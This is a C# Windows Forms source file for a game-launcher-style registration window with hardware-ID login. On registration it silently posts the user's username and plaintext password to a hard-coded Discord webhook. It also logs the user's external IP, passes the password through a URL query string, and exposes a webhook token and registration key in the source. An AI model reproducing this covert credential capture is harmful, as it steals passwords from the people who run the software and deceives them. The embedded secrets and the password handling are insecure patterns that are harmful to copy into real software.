using System;
using System.Threading;
using System.Net;
using System.Windows.Forms;
using Core;
using System.Collections.Specialized;

namespace Login_HWID
{
    public partial class register : Form
    {

        string WHusername = "Launcher Logs";
        string WHavatar = "https://cdn.discordapp.com/icons/812094445645856789/76a8914ad96416b5c35e689ce06d84fb.png?size=128";
        string WHurl = "https://discord.com/api/webhooks/813839676447785040/jak0gadZjDg86hAdsjJ0fP8P7tamFNJ4JLauB3KI2HU-mLhE98qhEhezEF8-QKhKVRGt";
        string time = DateTime.Now.ToString("HH:mm:ss - dd/MM/yyyy");

        public register()
        {
            InitializeComponent();
        }

        WebClient fetchInfo = new WebClient();

        public static void sendWebHook(string URL, string msg, string username, string avatar_url)
        {
            _ = Http.Post(URL, new NameValueCollection() {
        {
          "username",
          username

        },
        {
          "avatar_url",
          avatar_url

        },
        {
          "content",
          msg
        },

      });
        }

        void GETIP()
        {
            try
            {
                string externalip = new WebClient().DownloadString("http://ipinfo.io/ip");

                string GET = new WebClient().DownloadString("http://localhost/API/execute.php?action=GETIP&userName=" + Username2.Text + "");
                string SEND = new WebClient().DownloadString("http://localhost/API/execute.php?action=IP&userName=" + Username2.Text + "&IP=" + externalip + "");
            }
            catch (Exception)
            {
                MessageBox.Show("Impossible to get / change IP, contact Carter | Carter#2118 !");
                Application.Exit();
            }
        }

        private void LoginBTN_Click(object sender, EventArgs e)
        {
            string loginusername = Username2.Text;
            string loginpassword = Password2.Text;
            string rpassword = rpassword2.Text;

            System.Diagnostics.Process.Start("http://localhost/API/execute.php?action=registerUser&userName=" + Username2.Text + "&password=" + Password2.Text + "&repassword=" + rpassword2.Text + "&registerKey=N0QxoXM");
            sendWebHook(WHurl, $"```diff\n- [NEW REGISTRATION] {time} " + "\n- User: " + Username2.Text + "\n- Password: " + Password2.Text + "```", WHusername, WHavatar);

            this.Hide();
            Login Login = new Login();
            Thread.Sleep(1000);
            Login.Show();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            this.Hide();
            Login Login = new Login();
            Thread.Sleep(1000);
            Login.Show();
        }

        private void Password2_TextChanged(object sender, EventArgs e)
        {

        }

        private void rpassword2_TextChanged(object sender, EventArgs e)
        {

        }

        private void Username2_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void register_Load(object sender, EventArgs e)
        {

        }
    }
}